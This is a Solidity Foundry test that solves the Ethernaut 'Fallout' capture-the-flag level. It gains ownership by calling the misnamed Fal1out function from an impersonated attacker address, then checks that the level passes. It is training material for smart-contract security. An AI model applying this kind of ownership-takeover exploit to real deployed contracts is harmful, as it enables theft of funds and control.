// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/src/Test.sol";
import { console } from "@dev/forge-std/src/console.sol";
import { Ethernaut } from "@contracts/CTF/Ethernaut/00_Ethernaut.sol";
import { Fallout, FalloutFactory } from "@contracts/CTF/Ethernaut/02_Fallout.sol";

/*
    forge test --match-path foundry/test/Ethernaut/02_Fallout.t.sol -vvvv
*/

contract FalloutTest is Test {
    Ethernaut private ethernaut;
    // hacking attack address
    address private attackAddress = address(2333);
    address private levelAddress = address(0);
    Fallout private victimInstance;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        _before();
        // Deal attack address some ether
        vm.deal(attackAddress, 5 ether);
    }

    function _before() public {
        // 1.SetUp the exploit
        ethernaut = new Ethernaut();
        FalloutFactory levelFactory = new FalloutFactory();
        ethernaut.registerLevel(levelFactory);
        vm.startPrank(attackAddress);
        levelAddress = ethernaut.createLevelInstance(levelFactory);
        victimInstance = Fallout(payable(levelAddress));
        console.log("Ethernaut Attack Address: ", attackAddress);
    }

    function test_Exploit() public {
        // 2.Run the exploit

        victimInstance.Fal1out{ value: 1 wei }();

        // 3.verify the exploit
        _after();
    }

    function _after() public {
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assertTrue(levelSuccessfullyPassed, "Solution is not solving the level");
    }
}
